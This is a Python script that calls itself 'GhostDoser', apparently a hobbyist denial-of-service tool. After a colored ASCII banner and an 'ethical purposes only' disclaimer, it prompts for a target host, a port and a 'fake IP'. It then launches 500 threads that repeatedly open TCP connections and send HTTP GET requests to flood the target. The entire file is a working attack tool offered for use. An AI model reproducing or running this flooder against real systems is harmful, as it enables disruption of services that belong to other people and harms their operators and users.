import socket
import threading
import time
import colorama
from colorama import Fore
# made by andrew the skid

# initialize colorama
# REQUIREMENTS:
# socket
# threading 
# time
# colorama

colorama.init()
print(Fore.LIGHTBLACK_EX + "       ___")
print("     _/ oo\\ Please use me for ethical purposes only. :) ")
print("    ( \\  -/__")
print("     \\    \\__)")
print("     /     \\")
print("    /      _\\")
print("    `\"\"\"\"\"``")

print(Fore.RED + "░██████╗░██╗░░██╗░█████╗░░██████╗████████╗██████╗░░█████╗░░██████╗")
print(Fore.RED + "██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝")
print(Fore.RED + "██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░██║░░██║██║░░██║╚█████╗░")
print(Fore.RED + "██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░██║░░██║██║░░██║░╚═══██╗")
print(Fore.RED + "╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░██████╔╝╚█████╔╝██████╔╝")
print(Fore.RED + "░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░╚═════╝░░╚════╝░╚═════╝░")
print(Fore.MAGENTA + 'welcome to the GhostDoser')
print(Fore.MAGENTA + 'made by andrewtheskid')

# setting up the variables
print('you cannot select how many times this script runs so just keep it running until the reqeust times out')
target = str(input(Fore.BLUE + 'type in a target ip/domain: '))
port = int(input(Fore.BLUE + 'Type in the port number: '))
fake_ip = str(input(Fore.BLUE + 'Enter a fake ip address -doesnt really work -NUMBERS ONLY: '))

# validate the inputs
if not target or not port or not fake_ip:
    print(Fore.RED + 'Error: Invalid input values, exiting...')
    time.sleep(3)
    exit(1)

url = f'http://{target}/'


#attack
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print(Fore.GREEN + 'attacking... status: Sent!')
        except:
            print(Fore.RED + 'attacking... status: Request denied/invalid input/server down')
        time.sleep(0.5)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
